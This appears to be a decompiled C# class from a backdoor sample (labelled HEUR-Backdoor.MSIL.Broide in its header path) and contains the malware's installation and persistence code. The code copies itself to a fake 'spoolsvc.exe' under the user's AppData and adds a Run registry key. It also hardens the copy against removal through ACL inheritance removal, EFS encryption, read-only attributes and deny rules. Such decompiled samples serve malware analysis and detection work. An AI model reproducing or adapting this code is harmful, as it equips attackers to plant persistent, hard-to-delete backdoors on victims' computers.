// Decompiled with JetBrains decompiler
// Type: rtewsd.Startsd.testfunc
// Assembly: rtewsd, Version=1.0.0.23, Culture=neutral, PublicKeyToken=null
// MVID: 26A2B99D-71EF-4F92-906D-8BA9A2FB9EEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Broide.gen-4409d2170aa9989c6a8dd32b617c51a7c3e328b3c86410813c016691b2bd7774.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Windows.Forms;

namespace rtewsd.Startsd
{
  internal class testfunc
  {
    public static string inp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\spoolsvc.exe";

    public static void Install()
    {
      try
      {
        if (File.Exists(testfunc.inp))
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          if (registryKey.GetValue("SFddg") == null)
            registryKey.SetValue("SFddg", (object) Application.ExecutablePath);
          registryKey.Close();
          return;
        }
        WMIHelper.smethod_10(testfunc.inp, Application.ExecutablePath);
        testfunc.SetProtection();
        WMIHelper.smethod_9(testfunc.inp);
      }
      catch
      {
        testfunc.inp = testfunc.inp.Replace("Local", "LocalLow");
        Directory.CreateDirectory(testfunc.inp.Replace("spoolsvc.exe", string.Empty));
        new FileInfo(Application.ExecutablePath).CopyTo(testfunc.inp, true);
        testfunc.SetProtection();
        Process.Start(testfunc.inp);
      }
      Environment.Exit(0);
    }

    public static void SetProtection()
    {
      try
      {
        testfunc.DisableInher(testfunc.inp);
        testfunc.AddFileSecurity(testfunc.inp, Environment.UserName, FileSystemRights.FullControl, AccessControlType.Allow);
        File.Encrypt(testfunc.inp);
        File.SetAttributes(testfunc.inp, FileAttributes.ReadOnly | FileAttributes.Encrypted);
        testfunc.AddFileSecurity(testfunc.inp, Environment.UserName, FileSystemRights.WriteAttributes, AccessControlType.Deny);
        testfunc.AddFileSecurity(testfunc.inp, Environment.UserName, FileSystemRights.WriteExtendedAttributes, AccessControlType.Deny);
      }
      catch
      {
      }
    }

    public static void unlockFile()
    {
      testfunc.RemoveFileSecurity(testfunc.inp, Environment.UserName, FileSystemRights.WriteAttributes, AccessControlType.Deny);
      testfunc.RemoveFileSecurity(testfunc.inp, Environment.UserName, FileSystemRights.WriteExtendedAttributes, AccessControlType.Deny);
      File.SetAttributes(testfunc.inp, File.GetAttributes(testfunc.inp) & ~FileAttributes.ReadOnly);
    }

    public static void DisableInher(string Param_6)
    {
      FileSecurity accessControl = File.GetAccessControl(Param_6);
      accessControl.SetAccessRuleProtection(true, false);
      File.SetAccessControl(Param_6, accessControl);
    }

    public static void AddFileSecurity(
      string Param_7,
      string Param_8,
      FileSystemRights Param_9,
      AccessControlType Param_10)
    {
      try
      {
        FileSecurity accessControl = File.GetAccessControl(Param_7);
        accessControl.AddAccessRule(new FileSystemAccessRule(Param_8, Param_9, Param_10));
        File.SetAccessControl(Param_7, accessControl);
      }
      catch
      {
      }
    }

    public static void RemoveFileSecurity(
      string Param_11,
      string Param_12,
      FileSystemRights Param_13,
      AccessControlType Param_14)
    {
      try
      {
        FileSecurity accessControl = File.GetAccessControl(Param_11);
        accessControl.RemoveAccessRule(new FileSystemAccessRule(Param_12, Param_13, Param_14));
        File.SetAccessControl(Param_11, accessControl);
      }
      catch
      {
      }
    }
  }
}
